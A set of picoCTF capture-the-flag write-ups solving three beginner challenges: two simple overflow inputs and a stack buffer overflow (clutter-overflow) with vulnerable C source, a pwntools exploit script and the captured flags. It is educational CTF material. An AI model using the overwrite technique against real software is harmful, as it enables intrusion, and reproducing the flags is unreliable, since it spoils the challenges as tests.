# buffer overflow 0

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).Connect using:`nc saturn.picoctf.net 55418`

## Solution

In this challenge I read the source code and understood that the given code can only handle the input which is larger than 64 so I decided to just causes a buffer overflow error and did the following thing

```bash
nc saturn.picoctf.net 55418
Input: what are we doing irhgt now isncce iaophjsdfujasdcvasdjfasdf,.jxc jdcvxljsd flk;jasdf sadopfrujasdf
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

The output of the following was directly just the flag. 
## Flag

picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}


# Format string 0

Can you use your knowledge of format strings to make the customers happy?Download the binary [here](https://artifacts.picoctf.net/c_mimas/79/format-string-0).Download the source [here](https://artifacts.picoctf.net/c_mimas/79/format-string-0.c).Connect with the challenge instance here:`nc mimas.picoctf.net 49786`

## Solution

After reading the source code of this challenge I understood that I just need to put an input larger than 100 which will cause an overflow error and after that it will just return the flag. 

```bash
nc mimas.picoctf.net 49786
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,Breakf@st_Burger,
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}


```


## Flag

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}

# clutter-overflow

Clutter, clutter everywhere and not a byte to use.`nc mars.picoctf.net 31890`

## Solution

We are given a chall.c and a ./chall file. 
The code of `chall.c` is 
```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}


```

From this we can see that the size is 0x100 or 256 if we consider integer values. 

So I basically decided to do the same nonsense I have been doing for the past few challenges and just basically just cause a overflow error in order to get a flag. But that didn't work here. 
```bash
My room is so cluttered...
What do you see?
qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm
code == 0x7361706f69757974
code != 0xdeadbeef :(
```

However if I give a normal input to the same program this is what I get.

```bash
My room is so cluttered...
What do you see?
hello
code == 0x0
code != 0xdeadbeef :(
```

From this I was able to notice that some of the input was overflowing into the variable code. Also I needed to set the value of `code` to 0xdeadbeef so to do this I needed to see where does this overflow start occuring. 

```python
from pwn import *

io = remote("mars.picoctf.net", 31890)
io.recvuntil("What do you see?\n")
string = b"f" * 256
io.sendline(string)
io.interactive()
```

This was the base code since the size of the string was 256 and I starting increasing one by one but I kept getting the same output of `code = 0x0` till I reached 264. After that the value started going over to the variable code. So I found the value of deadbeef in little edian format and just put in after 264. 

```python
from pwn import *

io = remote("mars.picoctf.net", 31890)
io.recvuntil("What do you see?\n")
string = b"f" * 264
string += b"\xef\xbe\xad\xde"
io.sendline(string)
io.interactive()
```

This is the output of the code
```
[*] Switching to interactive mode
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
```

## Flag

picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Resources

https://youtu.be/9wepzpQhhio


